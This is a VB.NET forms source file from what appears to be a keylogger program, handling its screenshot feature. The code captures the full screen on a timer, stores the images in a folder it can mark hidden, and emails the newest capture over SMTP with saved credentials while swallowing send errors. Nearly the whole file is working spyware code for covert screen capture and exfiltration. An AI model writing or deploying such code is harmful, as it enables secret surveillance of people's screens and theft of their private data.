Imports System.IO
Imports System.Net.Mail




Public Class screenshotsettings


    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click


        Dim bounds As Rectangle
        Dim screenshot As System.Drawing.Bitmap
        Dim graph As Graphics
        bounds = Screen.PrimaryScreen.Bounds
        screenshot = New System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
        graph = Graphics.FromImage(screenshot)
        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
        PictureBox1.Image = screenshot
        SaveImageToFile(screenshot, My.Settings.ssdirectory & "\Screenshot.jpg")
       


    End Sub

    Private Function SaveImageToFile(image As Image, filePath As String) As String
        Dim folderPath = Path.GetDirectoryName(filePath)
        If File.Exists(filePath) Then

            Dim fileName = Path.GetFileNameWithoutExtension(filePath)
            Dim extension = Path.GetExtension(filePath)
            Dim fileNumber = 0

            Do
                fileNumber += 1
                filePath = Path.Combine(folderPath,
                                        String.Format("{0} ({1}){2}",
                                                      fileName,
                                                      fileNumber,
                                                      extension))
            Loop While File.Exists(filePath)
        End If
        Try
            image.Save(filePath)
        Catch ex As Exception

            If My.Computer.FileSystem.DirectoryExists(folderPath) = False Then
                My.Computer.FileSystem.CreateDirectory(folderPath)
            Else
                picturetimer.Stop()
                CheckBox5.Checked = False
                CheckBox6.Enabled = False
                MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")


            End If


        End Try
        Return filePath
    End Function

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        FolderBrowserDialog1.ShowDialog()
        TextBox1.Text = FolderBrowserDialog1.SelectedPath



    End Sub

    Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox1.TextChanged
        My.Settings.ssdirectory = TextBox1.Text
        My.Settings.Save()
        If My.Settings.ssdirectory = Nothing Then
            TextBox1.Text = "C:\Keylogger Log"
        End If
    End Sub

    Private Sub screenshotsettings_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            If My.Computer.FileSystem.DirectoryExists(My.Settings.ssdirectory) = False Then
                My.Computer.FileSystem.CreateDirectory(My.Settings.ssdirectory)
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
        Dim checkFile As System.IO.DirectoryInfo
        checkFile = My.Computer.FileSystem.GetDirectoryInfo(My.Settings.directory)
        Dim attributeReader As System.IO.FileAttributes
        attributeReader = checkFile.Attributes

        If (attributeReader And System.IO.FileAttributes.Hidden) > 0 Then
            CheckBox4.Checked = True
        Else
            CheckBox4.Checked = False
        End If
        TextBox1.Text = My.Settings.ssdirectory
        mostRecentCreatedFile()

        'Webcam 

    End Sub
  
    Private Sub Button13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button13.Click
        Try
            Process.Start(My.Settings.ssdirectory)
        Catch ex As Exception
            MsgBox("Could not open. Check to make sure that the directory exists.", MsgBoxStyle.Critical)

        End Try
    End Sub

    Private Sub CheckBox4_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox4.CheckedChanged
        Try
            If CheckBox4.Checked = True Then
                File.SetAttributes(My.Settings.ssdirectory, FileAttributes.Hidden)
               
            Else
                File.SetAttributes(My.Settings.ssdirectory, FileAttributes.Normal)
               
            End If
        Catch ex As Exception
            CheckBox4.Checked = False
            MsgBox(ex.Message, MsgBoxStyle.Critical)

        End Try
    End Sub


    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        My.Settings.sstimertinterval = NumericUpDown1.Value
        My.Settings.Save()
        Me.Hide()
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ComboBox1.SelectedIndexChanged
        If ComboBox1.SelectedItem = "seconds" Then
            picturetimer.Interval = NumericUpDown1.Value * "1000"
            My.Settings.sstimeramount = "seconds"
            My.Settings.sstimertinterval = NumericUpDown1.Value

        End If
        If ComboBox1.SelectedItem = "minutes" Then
            picturetimer.Interval = "60000" * NumericUpDown1.Value
            My.Settings.sstimeramount = "minutes"
            My.Settings.sstimertinterval = NumericUpDown1.Value
        End If
        If ComboBox1.SelectedItem = "hours" Then
            picturetimer.Interval = "3600000" * NumericUpDown1.Value
            My.Settings.sstimeramount = "hours"
            My.Settings.sstimertinterval = NumericUpDown1.Value
        End If
       
        My.Settings.Save()
    End Sub

   

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs)
        Try
            sendlog()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs)
        mostRecentCreatedFile()

    End Sub

    Private Sub Button5_Click(sender As System.Object, e As System.EventArgs)

    End Sub

    Private Sub FolderBrowserDialog1_HelpRequest(sender As System.Object, e As System.EventArgs) Handles FolderBrowserDialog1.HelpRequest

    End Sub
    Function IfEmpty(MyPath As String) As Boolean
        IfEmpty = (Dir(MyPath & "\*.*") = "")
    End Function
    Private Sub Button6_Click(sender As System.Object, e As System.EventArgs) Handles Button6.Click

        If MsgBox("Clearing the foler will permanently delete all the pictures stored in this folder. Are you sure you want to do this?  ", MsgBoxStyle.YesNo) = Windows.Forms.DialogResult.Yes Then
            Try
                If IfEmpty(My.Settings.ssdirectory) = True Then
                    MsgBox("Folder is already empty", MsgBoxStyle.Critical)

                Else

                    For Each foundFile As String In My.Computer.FileSystem.GetFiles(
        My.Settings.ssdirectory,
        Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, "*.*")

                        My.Computer.FileSystem.DeleteFile(foundFile)
                    Next

         

                End If
            Catch ex As Exception
                MsgBox(ex.Message, MsgBoxStyle.Critical)
            End Try
        End If
    End Sub

    Private Sub CheckBox5_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox5.CheckedChanged
        If CheckBox5.Checked = True Then
            If My.Settings.email = Nothing Then
                picturetimer.Stop()
                MsgBox("There is no email set. Please set an email first in the email settings.", MsgBoxStyle.Critical)
                NumericUpDown1.Enabled = False
                ComboBox1.Enabled = False
                CheckBox5.Checked = False
                CheckBox6.Enabled = False
                My.Settings.takescreenshot = False
                My.Settings.Save()
            Else
                If CheckBox6.Checked = True Then
                    sendlog()
                End If
            End If
            NumericUpDown1.Enabled = True
            ComboBox1.Enabled = True
            CheckBox6.Enabled = True
            picturetimer.Start()
            My.Settings.takescreenshot = True
           
            My.Settings.Save()
        Else
            My.Settings.takescreenshot = False
            picturetimer.Stop()
            CheckBox6.Enabled = False
            NumericUpDown1.Enabled = False
            ComboBox1.Enabled = False
        End If
        If My.Settings.email = Nothing Then
            picturetimer.Stop()
            NumericUpDown1.Enabled = False
            ComboBox1.Enabled = False
            CheckBox5.Checked = False
            CheckBox6.Enabled = False
            My.Settings.takescreenshot = False
            My.Settings.Save()
        End If
        My.Settings.Save()
    End Sub

    Private Sub picturetimer_Tick(sender As System.Object, e As System.EventArgs) Handles picturetimer.Tick
        mostRecentCreatedFile()
        Dim bounds As Rectangle
        Dim screenshot As System.Drawing.Bitmap
        Dim graph As Graphics
        bounds = Screen.PrimaryScreen.Bounds
        screenshot = New System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
        graph = Graphics.FromImage(screenshot)
        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
        PictureBox1.Image = screenshot
        SaveImageToFile(screenshot, My.Settings.ssdirectory & "/Screenshot.jpg")
        If CheckBox6.Checked = True Then
            sendlog()
        End If
       
    End Sub

    Private Sub NumericUpDown1_ValueChanged(sender As System.Object, e As System.EventArgs) Handles NumericUpDown1.ValueChanged

        If ComboBox1.SelectedItem = "seconds" Then
            picturetimer.Interval = NumericUpDown1.Value * "1000"

        End If
        If ComboBox1.SelectedItem = "minutes" Then
            picturetimer.Interval = "60000" * NumericUpDown1.Value
        End If
        If ComboBox1.SelectedItem = "hours" Then
            picturetimer.Interval = "3600000" * NumericUpDown1.Value
        End If

        My.Settings.Save()
    End Sub

    Private Sub CheckBox6_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox6.CheckedChanged
        If CheckBox6.Checked = True And ComboBox1.SelectedItem = "seconds" Then
            If MsgBox("It appears you want to send email by the seconds. Please be aware, if you send emails too often at a time ( < 15 seconds) then the program can become very unresponsive, it is highly recommended that you don't send emails very often. Do you still want to send emails anyway? ", MsgBoxStyle.YesNo) = Windows.Forms.DialogResult.Yes Then
                CheckBox6.Checked = True
                My.Settings.emailphotos = True
            Else
                CheckBox6.Checked = False
                My.Settings.emailphotos = True
            End If

        End If
        If CheckBox6.Checked = True Then
            My.Settings.emailphotos = True
        Else
            My.Settings.emailphotos = False
        End If
        My.Settings.Save()
    End Sub
    Private Sub sendlog()
     


        Try

            Dim SMTPClient As New SmtpClient
            SMTPClient.Host = My.Settings.smtpserver
            SMTPClient.Port = My.Settings.smtpport
            SMTPClient.EnableSsl = My.Settings.enablessl
            Dim UsernamePassword As New Net.NetworkCredential(My.Settings.gmusername, My.Settings.gmpassword)
            SMTPClient.Credentials = UsernamePassword
            Dim MailMsg As New MailMessage("keylogger@gmail.com", My.Settings.email, "Keylogger Screenshot", "Here are your screenshots!")
            Dim MsgAtt As New Attachment(My.Settings.ssdirectory & "\" & Label1.Text)
            MailMsg.Attachments.Add(MsgAtt)

            SMTPClient.Send(MailMsg)
          
        Catch ex As Exception

        End Try





    End Sub

    Sub mostRecentCreatedFile()
        Try
            ' Declare a variable of type FileInfo named aFileInfo.
            Dim aFileInfo As System.IO.FileInfo
            ' Declare a variable of type FileInfo Array named FileInfos.
            Dim fileInfos() As System.IO.FileInfo

            ' Declare a variable of type DirectoryInfo named aDirectoryInfo.
            Dim aDirectoryInfo As System.IO.DirectoryInfo
            ' Use the New constructor to create a DirectoryInfo object
            ' Change the Folder as required
            aDirectoryInfo = New System.IO.DirectoryInfo(My.Settings.ssdirectory)

            ' Call GetFiles function of the DirectoryInfo object
            ' This example checks ALL files but you can change it as required e.g. *.doc
            ' Assign the result to the fileInfos array variable.
            fileInfos = aDirectoryInfo.GetFiles("*.*")

            ' Set up a default DateTime
            Dim EarlyDate As New DateTime(1000)
            Dim strLatestFile As String = String.Empty


            ' Test against previous date time
            For Each aFileInfo In fileInfos
                If aFileInfo.LastWriteTime > EarlyDate Then
                    strLatestFile = aFileInfo.Name
                    EarlyDate = aFileInfo.LastWriteTime
                End If
            Next

            Label1.Text = strLatestFile
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button3_Click_1(sender As System.Object, e As System.EventArgs)
        NumericUpDown1.Value = 32
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    

End Class